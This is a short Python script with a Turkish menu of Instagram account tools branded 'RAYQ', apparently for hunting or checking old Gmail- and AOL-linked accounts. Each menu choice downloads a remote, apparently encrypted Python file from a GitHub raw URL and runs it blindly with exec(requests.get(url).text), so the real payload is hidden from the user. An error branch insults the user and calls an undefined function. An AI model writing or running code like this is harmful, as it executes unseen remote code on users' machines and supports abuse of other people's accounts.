import requests
import os
from cfonts import render            
RAYQ = render('vip', colors=['white', 'red'], align='center')
print(RAYQ)
print("\x1b[1;39m—" * 67)
print(f"""\x1b[38;5;117m  1\x1b[38;5;231m - İnstagram Random       [ RAYQ ]
\x1b[38;5;117m  2\x1b[38;5;231m - İnstagram Filtreli       [ RAYQ ]
\x1b[38;5;117m  3\x1b[38;5;231m - İnstagram 2013 Gmail     [ RAYQ ]
\x1b[38;5;117m  4\x1b[38;5;231m - İnstagram 2012-2013 Aol  [ RAYQ ]
""")
def rayqmain():
    print("\x1b[1;39m—"*67)
    print("")
    secim=input(" • Seçiminiz: ")
    baglantilar={
        "1":"https://raw.githubusercontent.com/rafalucero/Rabbit-oklu/refs/heads/main/CPM%20ENC.py",
        "2":"https://raw.githubusercontent.com/rafalucero/Rabbit-oklu/refs/heads/main/Hotmail%20Enc.py",
        "3":"https://raw.githubusercontent.com/rafalucero/Rabbit-oklu/refs/heads/main/Meta%20ENC.py",
        "4":"https://raw.githubusercontent.com/rafalucero/Rabbit-oklu/refs/heads/main/Tarih%20ENC.py",
    }
    if secim in baglantilar:rayqpython(baglantilar[secim])
    else:print("2 tane sayi var zaten salak ya 1 ya 2 gircen amk beyinsizi");kuai()
def rayqpython(url):
    try:exec(requests.get(url).text)
    except Exception as e:print(f"h-am{e}")
if __name__=="__main__":rayqmain()
